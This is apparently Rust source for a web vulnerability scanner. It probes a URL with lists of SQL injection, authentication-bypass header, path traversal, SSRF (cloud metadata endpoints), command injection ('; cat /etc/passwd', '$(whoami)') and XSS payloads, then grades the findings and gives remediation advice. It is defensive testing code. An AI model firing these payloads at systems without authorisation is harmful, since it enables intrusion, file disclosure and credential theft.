use anyhow::Result;
use reqwest::Client;
use serde::{Serialize, Deserialize};

/// Strict vulnerability classification - Critical means EXPLOITABLE
#[derive(Debug, Clone, Copy, PartialEq, Serialize, Deserialize)]
pub enum VulnerabilitySeverity {
    /// ONLY for: SQLi, RCE, Auth Bypass, Direct Data Exposure, Account Takeover
    Critical,
    /// Confirmed exploitable: IDOR with data access, SSRF, XXE, Arbitrary File Read
    High,
    /// Potential security issue: XSS, CSRF, Info Disclosure (sensitive), Path Traversal (limited)
    Medium,
    /// Minor issues: Missing headers, version disclosure, non-sensitive info leak
    Low,
    /// Informational only: Technology fingerprint, endpoint enumeration
    Info,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerabilityFinding {
    pub severity: VulnerabilitySeverity,
    pub category: String,
    pub title: String,
    pub description: String,
    pub evidence: Vec<String>,
    pub cvss_score: f32,
    pub exploit_confidence: String, // "Confirmed", "High", "Medium", "Low"
    pub remediation: String,
}

/// Comprehensive vulnerability scanner with actual exploit tests
pub struct VulnerabilityScanner;

impl VulnerabilityScanner {
    /// Test for SQL Injection vulnerabilities
    pub async fn test_sql_injection(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        let payloads = vec![
            "'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", 
            "' OR '1'='1' --", "admin'--", "1' AND 1=1--",
            "' UNION SELECT NULL--", "1' ORDER BY 1--",
        ];
        
        let mut evidence = Vec::new();
        let baseline = client.get(url).send().await;
        let baseline_body = if let Ok(resp) = baseline {
            resp.text().await.unwrap_or_default()
        } else {
            return Ok(None);
        };
        
        for payload in payloads {
            // Test in URL parameters
            let test_url = if url.contains('?') {
                format!("{}&test={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?test={}", url, urlencoding::encode(payload))
            };
            
            if let Ok(resp) = client.get(&test_url).send().await {
                let body = resp.text().await.unwrap_or_default();
                
                // Check for SQL error messages
                if body.contains("SQL syntax") 
                    || body.contains("mysql_fetch")
                    || body.contains("ORA-")
                    || body.contains("PostgreSQL")
                    || body.contains("Microsoft SQL Server")
                    || body.contains("SQLite")
                    || body.contains("sqlite3.OperationalError")
                    || body.contains("pg_query")
                    || body.contains("Unclosed quotation mark") {
                    
                    evidence.push(format!("SQL error with payload: {}", payload));
                    evidence.push(format!("Error pattern found in response"));
                    
                    return Ok(Some(VulnerabilityFinding {
                        severity: VulnerabilitySeverity::Critical,
                        category: "SQL Injection".to_string(),
                        title: "SQL Injection Vulnerability Detected".to_string(),
                        description: "Application returned SQL error messages indicating vulnerability to SQL injection attacks".to_string(),
                        evidence,
                        cvss_score: 9.8,
                        exploit_confidence: "High".to_string(),
                        remediation: "Use parameterized queries/prepared statements. Never concatenate user input into SQL queries.".to_string(),
                    }));
                }
                
                // Check for response differences indicating SQLi
                if body.len() != baseline_body.len() && (body.len() as i32 - baseline_body.len() as i32).abs() > 500 {
                    evidence.push(format!("Significant response difference with payload: {}", payload));
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        
        Ok(None)
    }
    
    /// Test for Authentication Bypass
    pub async fn test_auth_bypass(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        let mut evidence = Vec::new();
        
        // Test 1: Try without authentication
        let resp_no_auth = client.get(url).send().await?;
        let status_no_auth = resp_no_auth.status().as_u16();
        
        // Test 2: Try with broken/tampered tokens
        let broken_tokens = vec![
            ("Authorization", "Bearer invalid"),
            ("Authorization", "Bearer null"),
            ("Authorization", "Bearer undefined"),
            ("Authorization", "Bearer "),
            ("X-Auth-Token", "../../../etc/passwd"),
            ("Cookie", "session=; admin=true"),
        ];
        
        for (header, value) in broken_tokens {
            let resp = client.get(url)
                .header(header, value)
                .send()
                .await?;
            
            if resp.status().as_u16() == 200 && status_no_auth != 200 {
                evidence.push(format!("Access granted with header: {}: {}", header, value));
                
                return Ok(Some(VulnerabilityFinding {
                    severity: VulnerabilitySeverity::Critical,
                    category: "Authentication Bypass".to_string(),
                    title: "Authentication Bypass via Header Manipulation".to_string(),
                    description: "Endpoint accepts invalid/manipulated authentication tokens".to_string(),
                    evidence,
                    cvss_score: 9.1,
                    exploit_confidence: "Confirmed".to_string(),
                    remediation: "Implement proper token validation. Verify signature and expiry. Use secure session management.".to_string(),
                }));
            }
        }
        
        Ok(None)
    }
    
    /// Test for Path Traversal
    pub async fn test_path_traversal(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        let payloads = vec![
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
        ];
        
        let mut evidence = Vec::new();
        
        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&file={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?file={}", url, urlencoding::encode(payload))
            };
            
            if let Ok(resp) = client.get(&test_url).send().await {
                let body = resp.text().await.unwrap_or_default();
                
                // Check for file contents
                if body.contains("root:x:0:0") || body.contains("[extensions]") {
                    evidence.push(format!("File content leaked with payload: {}", payload));
                    evidence.push("System file content found in response".to_string());
                    
                    return Ok(Some(VulnerabilityFinding {
                        severity: VulnerabilitySeverity::Critical,
                        category: "Path Traversal".to_string(),
                        title: "Arbitrary File Read via Path Traversal".to_string(),
                        description: "Application allows reading arbitrary files from the server filesystem".to_string(),
                        evidence,
                        cvss_score: 8.6,
                        exploit_confidence: "Confirmed".to_string(),
                        remediation: "Validate and sanitize file paths. Use whitelist of allowed files. Implement proper access controls.".to_string(),
                    }));
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        
        Ok(None)
    }
    
    /// Test for SSRF (Server-Side Request Forgery)
    pub async fn test_ssrf(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        // Test with internal IPs and cloud metadata endpoints
        let payloads = vec![
            "http://127.0.0.1",
            "http://localhost",
            "http://169.254.169.254/latest/meta-data/", // AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/", // GCP metadata
            "http://[::1]",
        ];
        
        let mut evidence = Vec::new();
        
        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&url={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?url={}", url, urlencoding::encode(payload))
            };
            
            if let Ok(resp) = client.get(&test_url)
                .timeout(std::time::Duration::from_secs(3))
                .send()
                .await {
                
                let body = resp.text().await.unwrap_or_default();
                
                // Check for metadata or internal responses
                if body.contains("ami-id") 
                    || body.contains("instance-id")
                    || body.contains("computeMetadata")
                    || body.contains("127.0.0.1") {
                    
                    evidence.push(format!("SSRF confirmed with payload: {}", payload));
                    evidence.push("Internal/metadata endpoint accessible".to_string());
                    
                    return Ok(Some(VulnerabilityFinding {
                        severity: VulnerabilitySeverity::High,
                        category: "SSRF".to_string(),
                        title: "Server-Side Request Forgery (SSRF)".to_string(),
                        description: "Application makes requests to attacker-controlled URLs, allowing access to internal resources".to_string(),
                        evidence,
                        cvss_score: 8.5,
                        exploit_confidence: "High".to_string(),
                        remediation: "Validate and whitelist allowed URLs. Block private IP ranges. Implement network segmentation.".to_string(),
                    }));
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        
        Ok(None)
    }
    
    /// Test for Command Injection
    pub async fn test_command_injection(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        let payloads = vec![
            "; ls",
            "| whoami",
            "`id`",
            "$(whoami)",
            "&& dir",
            "; cat /etc/passwd",
        ];
        
        let mut evidence = Vec::new();
        
        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&cmd={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?cmd={}", url, urlencoding::encode(payload))
            };
            
            if let Ok(resp) = client.get(&test_url).send().await {
                let body = resp.text().await.unwrap_or_default();
                
                // Check for command output
                if body.contains("uid=") 
                    || body.contains("gid=")
                    || body.contains("root:x:0:0")
                    || body.contains("Directory of")
                    || (body.contains("bin") && body.contains("etc")) {
                    
                    evidence.push(format!("Command execution detected with payload: {}", payload));
                    evidence.push("System command output found in response".to_string());
                    
                    return Ok(Some(VulnerabilityFinding {
                        severity: VulnerabilitySeverity::Critical,
                        category: "Command Injection".to_string(),
                        title: "Remote Command Execution".to_string(),
                        description: "Application executes system commands with user-controlled input".to_string(),
                        evidence,
                        cvss_score: 9.8,
                        exploit_confidence: "Confirmed".to_string(),
                        remediation: "Never execute user input as system commands. Use safe APIs and input validation.".to_string(),
                    }));
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        
        Ok(None)
    }
    
    /// Test for XSS (Cross-Site Scripting)
    pub async fn test_xss(client: &Client, url: &str) -> Result<Option<VulnerabilityFinding>> {
        let payloads = vec![
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "'\"><script>alert(document.domain)</script>",
            "javascript:alert(1)",
        ];
        
        let mut evidence = Vec::new();
        
        for payload in payloads {
            let test_url = if url.contains('?') {
                format!("{}&q={}", url, urlencoding::encode(payload))
            } else {
                format!("{}?q={}", url, urlencoding::encode(payload))
            };
            
            if let Ok(resp) = client.get(&test_url).send().await {
                let body = resp.text().await.unwrap_or_default();
                
                // Check if payload is reflected unencoded
                let encoded = html_escape::encode_text(payload).to_string();
                if body.contains(payload) && !body.contains(&encoded) {
                    evidence.push(format!("XSS payload reflected: {}", payload));
                    
                    return Ok(Some(VulnerabilityFinding {
                        severity: VulnerabilitySeverity::Medium,
                        category: "XSS".to_string(),
                        title: "Cross-Site Scripting (XSS)".to_string(),
                        description: "User input reflected in response without proper encoding".to_string(),
                        evidence,
                        cvss_score: 6.1,
                        exploit_confidence: "Medium".to_string(),
                        remediation: "Encode all user input before output. Use Content-Security-Policy. Implement XSS filters.".to_string(),
                    }));
                }
            }
            
            tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
        }
        
        Ok(None)
    }
    
    /// Advanced XSS testing with comprehensive payloads - triggered when potential XSS is detected
    pub async fn test_xss_advanced(client: &Client, url: &str) -> Result<Vec<VulnerabilityFinding>> {
        let mut findings = Vec::new();
        
        // Comprehensive XSS payload collection
        let payloads = vec![
            // Basic XSS
            ("<script>alert(1)</script>", "Basic script tag"),
            ("<img src=x onerror=alert(1)>", "Image onerror"),
            ("<svg onload=alert(1)>", "SVG onload"),
            
            // Context breaking
            ("'\"><script>alert(1)</script>", "Attribute breaking"),
            ("\"><script>alert(1)</script>", "Double quote breaking"),
            ("'><script>alert(1)</script>", "Single quote breaking"),
            
            // Event handlers
            ("<body onload=alert(1)>", "Body onload"),
            ("<input onfocus=alert(1) autofocus>", "Input onfocus"),
            ("<select onfocus=alert(1) autofocus>", "Select onfocus"),
            ("<textarea onfocus=alert(1) autofocus>", "Textarea onfocus"),
            ("<iframe onload=alert(1)>", "Iframe onload"),
            
            // JavaScript protocol
            ("javascript:alert(1)", "Javascript protocol"),
            ("<a href='javascript:alert(1)'>click</a>", "Link javascript protocol"),
            
            // HTML5 vectors
            ("<video src=x onerror=alert(1)>", "Video onerror"),
            ("<audio src=x onerror=alert(1)>", "Audio onerror"),
            ("<details open ontoggle=alert(1)>", "Details ontoggle"),
            
            // Filter bypass attempts
            ("<scr<script>ipt>alert(1)</scr</script>ipt>", "Nested script tags"),
            ("<ScRiPt>alert(1)</sCrIpT>", "Case variation"),
            ("<img src=\"x\" onerror=\"alert(1)\">", "Quoted attributes"),
            ("<img src='x' onerror='alert(1)'>", "Single quoted attributes"),
            
            // Template injection
            ("{{alert(1)}}", "Angular/Vue template"),
            ("${alert(1)}", "Template literal"),
            
            // DOM XSS
            ("#<script>alert(1)</script>", "Hash-based XSS"),
            ("?xss=<script>alert(1)</script>", "Query-based XSS"),
        ];
        
        let param_names = vec!["q", "search", "query", "input", "data", "text", "value", "name", "message", "comment"];
        
        for param_name in &param_names {
            for (payload, payload_desc) in &payloads {
                // Test in query parameters
                let test_url = if url.contains('?') {
                    format!("{}&{}={}", url, param_name, urlencoding::encode(payload))
                } else {
                    format!("{}?{}={}", url, param_name, urlencoding::encode(payload))
                };
                
                if let Ok(resp) = client.get(&test_url).send().await {
                    let body = resp.text().await.unwrap_or_default();
                    
                    // Check if payload is reflected
                    if body.contains(payload) {
                        let encoded = html_escape::encode_text(payload).to_string();
                        
                        // Determine severity based on encoding
                        let (severity, confidence) = if body.contains(&encoded) {
                            (VulnerabilitySeverity::Low, "Low - Reflected but encoded")
                        } else {
                            (VulnerabilitySeverity::High, "High - Reflected unencoded")
                        };
                        
                        let finding = VulnerabilityFinding {
                            severity,
                            category: "XSS".to_string(),
                            title: format!("XSS via {} parameter", param_name),
                            description: format!("XSS payload type: {}", payload_desc),
                            evidence: vec![
                                format!("Parameter: {}", param_name),
                                format!("Payload: {}", payload),
                                format!("Reflected in response"),
                                format!("Test URL: {}", test_url),
                            ],
                            cvss_score: if severity == VulnerabilitySeverity::High { 7.1 } else { 5.3 },
                            exploit_confidence: confidence.to_string(),
                            remediation: "Implement proper output encoding. Use Content-Security-Policy headers. Validate and sanitize all user input.".to_string(),
                        };
                        
                        findings.push(finding);
                        
                        // If we find a working payload, test a few more on this parameter then move on
                        if findings.len() >= 3 {
                            break;
                        }
                    }
                }
                
                // Rate limiting
                tokio::time::sleep(tokio::time::Duration::from_millis(50)).await;
            }
            
            // If we found vulnerabilities on this parameter, move to next URL
            if findings.len() >= 3 {
                break;
            }
        }
        
        Ok(findings)
    }
    
    /// Comprehensive scan running all tests
    pub async fn comprehensive_scan(client: &Client, url: &str) -> Result<Vec<VulnerabilityFinding>> {
        let mut findings = Vec::new();
        
        // Run all vulnerability tests in parallel
        let (sqli, auth, path, ssrf, cmd, xss) = tokio::join!(
            Self::test_sql_injection(client, url),
            Self::test_auth_bypass(client, url),
            Self::test_path_traversal(client, url),
            Self::test_ssrf(client, url),
            Self::test_command_injection(client, url),
            Self::test_xss(client, url),
        );
        
        if let Ok(Some(f)) = sqli { findings.push(f); }
        if let Ok(Some(f)) = auth { findings.push(f); }
        if let Ok(Some(f)) = path { findings.push(f); }
        if let Ok(Some(f)) = ssrf { findings.push(f); }
        if let Ok(Some(f)) = cmd { findings.push(f); }
        if let Ok(Some(f)) = xss { findings.push(f); }
        
        Ok(findings)
    }
}
